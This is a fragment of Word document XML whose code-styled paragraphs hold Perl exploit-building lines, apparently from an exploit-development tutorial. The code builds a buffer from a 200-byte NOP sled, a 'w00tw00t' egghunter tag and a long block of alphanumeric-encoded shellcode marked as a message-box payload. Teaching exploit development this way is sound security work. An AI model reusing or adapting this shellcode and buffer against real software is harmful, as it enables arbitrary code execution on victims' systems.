                    <w:p w14:paraId="36AFFB2A" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x42\x50\x58\x48\x4d\x46\x4e\x47\x4c\x43\x35\x51\x4a\x42\x54\x4a\x4f" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="18433CF3" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x4e\x58\x42\x57\x46\x50\x46\x50\x44\x34\x4c\x4b\x4b\x4a\x4e\x4f\x44" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="6685E82D" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x35\x4b\x5a\x4e\x4f\x43\x45\x4b\x57\x4b\x4f\x4d\x37\x41\x41";</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="3A290580" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="52C4E2B4" w14:textId="686A6033" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>$buffer .= "\x90" x 200;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidR="00E72F21">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00E72F21">
                        <w:rPr>
                          <w:color w:val="8DC182" w:themeColor="accent4" w:themeTint="99"/>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>#ANOTHER SLED TO DEMONSTRATE DISTANCE</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="663A001C" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>$buffer .= "w00tw00t";</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00E72F21">
                        <w:rPr>
                          <w:color w:val="8DC182" w:themeColor="accent4" w:themeTint="99"/>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>#w00tw00t TAG</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="5A232184" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="10C99BA6" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>$buffer .= "\x89\xe7\</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>xdb</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>\xd0\xd9\x77\xf4\x5d\x55\x59\x49\x49\x49\x49" .</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00E72F21">
                        <w:rPr>
                          <w:color w:val="8DC182" w:themeColor="accent4" w:themeTint="99"/>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>#MESSAGEBOX PAYLOAD</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="2164E8DA" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="3745B9DB" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="08F7C50D" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="244F49EF" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x49\x49\x5a" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="10D410DF" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x4b\x4d\x4b\x49\x49\x52\x54\x56\x44\x5a\x54\x56\x51\x4e" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="3297F395" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x32\x4f\x42\x52\x57\x56\x51\x49\x59\x45\x34\x4c\x4b\x54" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="0A687A4B" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x31\x56\x50\x4c\x4b\x52\x56\x54\x4c\x4c\x4b\x43\x46\x45" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="65283695" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x4c\x4c\x4b\x47\x36\x54\x48\x4c\x4b\x43\x4e\x47\x50\x4c" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="52C2D9D4" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x4b\x47\x46\x56\x58\x50\x4f\x45\x48\x43\x45\x4c\x33\x56" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="182B82D8" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x39\x45\x51\x58\x51\x4b\x4f\x4b\x51\x43\x50\x4c\x4b\x52" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="5847505D" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x4c\x51\x34\x51\x34\x4c\x4b\x51\x55\x47\x4c\x4c\x4b\x56" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="42E2ECF5" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x34\x56\x48\x52\x58\x45\x51\x5a\x4a\x4c\x4b\x50\x4a\x54" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="16A93F6F" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x58\x4c\x4b\x51\x4a\x47\x50\x45\x51\x5a\x4b\x4b\x53\x47" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="75F34349" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x44\x50\x49\x4c\x4b\x50\x34\x4c\x4b\x43\x31\x5a\x4e\x50" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="1069500B" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x31\x4b\x4f\x50\x31\x49\x50\x4b\x4c\x4e\x4c\x4d\x54\x49" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="333067AD" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x50\x54\x34\x43\x37\x4f\x31\x58\x4f\x54\x4d\x43\x31\x58" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="63061BBB" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x47\x5a\x4b\x5a\x54\x47\x4b\x43\x4c\x51\x34\x47\x58\x52" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="7C62C480" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x55\x4d\x31\x4c\x4b\x51\x4a\x51\x34\x43\x31\x5a\x4b\x52" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="74194E18" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x46\x4c\x4b\x54\x4c\x50\x4b\x4c\x4b\x50\x5a\x45\x4c\x43" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="09D5E8A1" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x31\x5a\x4b\x4c\x4b\x43\x34\x4c\x4b\x43\x31\x4b\x58\x4d" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="6E4A3058" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x59\x50\x44\x56\x44\x45\x4c\x43\x51\x58\x43\x58\x32\x43" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="2F2D813A" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x38\x47\x59\x4e\x34\x4c\x49\x4b\x55\x4b\x39\x4f\x32\x52" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="7FC35F37" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x48\x4c\x4e\x50\x4e\x54\x4e\x5a\x4c\x50\x52\x4d\x38\x4d" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="0528B652" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x4f\x4b\x4f\x4b\x4f\x4b\x4f\x4b\x39\x47\x35\x54\x44\x4f" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="05E72CA7" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x4b\x43\x4e\x49\x48\x4b\x52\x52\x53\x4d\x57\x45\x4c\x51" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="10A8B360" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x34\x56\x32\x4b\x58\x4c\x4e\x4b\x4f\x4b\x4f\x4b\x4f\x4b" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="32F61FE6" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x39\x51\x55\x54\x48\x52\x48\x52\x4c\x52\x4c\x51\x30\x47" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="273292F9" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x31\x45\x38\x56\x53\x47\x42\x56\x4e\x45\x34\x45\x38\x54" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="5A3D1AD2" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x35\x43\x43\x43\x55\x43\x42\x4c\x48\x51\x4c\x56\x44\x54" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="753AC540" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x4a\x4c\x49\x4d\x36\x51\x46\x4b\x4f\x56\x35\x43\x34\x4b" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="6AAE15B8" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x39\x49\x52\x56\x30\x4f\x4b\x49\x38\x4e\x42\x50\x4d\x4f" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="33841C38" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x4c\x4c\x47\x45\x4c\x56\x44\x50\x52\x5a\x48\x45\x31\x4b" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="6E3B6B28" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x4f\x4b\x4f\x4b\x4f\x52\x48\x52\x4f\x54\x38\x51\x48\x47" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="788ABD10" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x50\x43\x58\x43\x51\x52\x47\x52\x45\x50\x42\x43\x58\x50" .</w:t>
                      </w:r>
                    </w:p>
